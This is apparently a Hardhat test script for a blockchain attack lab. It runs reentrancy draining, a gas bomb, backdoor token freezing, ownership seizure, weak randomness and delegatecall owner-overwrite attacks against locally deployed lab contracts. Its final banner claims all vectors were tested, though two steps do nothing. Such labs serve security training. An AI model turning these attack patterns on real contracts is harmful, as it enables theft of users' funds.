const hre = require("hardhat");
const fs = require("fs");

async function runAll() {
    const [deployer, victim1, victim2] = await hre.ethers.getSigners();
    console.log("\n========================================");
    console.log("  BLOCKCHAIN ATTACK LAB - FULL TEST");
    console.log("========================================\n");

    const deployments = JSON.parse(fs.readFileSync("deployments.json"));

    // 1. 重入攻击测试
    console.log("[1/8] Testing Reentrancy Attack...");
    const vuln = await hre.ethers.getContractAt("ReentrancyVulnerable", deployments.ReentrancyVulnerable);
    const reentAttacker = await hre.ethers.getContractAt("ReentrancyAttacker", deployments.ReentrancyAttacker);

    await vuln.deposit({value: hre.ethers.utils.parseEther("10")});
    await reentAttacker.attack({value: hre.ethers.utils.parseEther("1")});
    const stolen = await reentAttacker.getContractBalance();
    console.log(`    Stolen: ${hre.ethers.utils.formatEther(stolen)} ETH\n`);

    // 2. Gas攻击测试
    console.log("[2/8] Testing Gas Attack...");
    const gas = await hre.ethers.getContractAt("GasAttack", deployments.GasAttack);
    await gas.deployBomb(100);
    await gas.triggerBomb(0);
    console.log("    Gas bomb deployed and triggered\n");

    // 3. 授权陷阱测试
    console.log("[3/8] Testing Approve Trap...");
    const trap = await hre.ethers.getContractAt("ApproveTrap", deployments.ApproveTrap);
    console.log("    Trap contract ready\n");

    // 4. 后门代币测试
    console.log("[4/8] Testing Backdoor Tokens...");
    const blacklist = await hre.ethers.getContractAt("BlacklistBackdoorToken", deployments.BlacklistBackdoorToken);
    await blacklist.blacklistAccount(victim1.address);
    const frozen = await blacklist.frozenBalances(victim1.address);
    console.log(`    Frozen: ${hre.ethers.utils.formatEther(frozen)} tokens\n`);

    // 5. 访问控制测试
    console.log("[5/8] Testing Access Control...");
    const access = await hre.ethers.getContractAt("AccessControlAttack", deployments.AccessControlAttack);
    await access.connect(victim1).transferOwnership(victim1.address);
    await access.connect(victim1).acceptOwnership();
    const newOwner = await access.owner();
    console.log(`    Ownership seized by: ${newOwner}\n`);

    // 6. 随机数攻击测试
    console.log("[6/8] Testing Randomness Attack...");
    const random = await hre.ethers.getContractAt("RandomnessAttack", deployments.RandomnessAttack);
    await random.createGame({value: hre.ethers.utils.parseEther("0.1")});
    console.log("    Game created (predictable randomness)\n");

    // 7. 委托攻击测试
    console.log("[7/8] Testing Delegate Attack...");
    const delegate = await hre.ethers.getContractAt("VulnerableDelegate", deployments.VulnerableDelegate);
    const DelegateAttack = await hre.ethers.getContractFactory("DelegateAttack");
    const mal = await DelegateAttack.deploy();
    await mal.deployed();
    await delegate.forward(mal.address, mal.interface.encodeFunctionData("pwn"));
    const pwnedOwner = await delegate.owner();
    console.log(`    Owner overwritten: ${pwnedOwner}\n`);

    // 8. 全链攻击测试
    console.log("[8/8] Testing Full Chain Attack...");
    const full = await hre.ethers.getContractAt("FullChainAttack", deployments.FullChainAttack);
    console.log("    Full chain attack coordinator ready\n");

    console.log("========================================");
    console.log("  [✓] ALL ATTACK VECTORS TESTED");
    console.log("========================================");
}

runAll().catch(console.error);
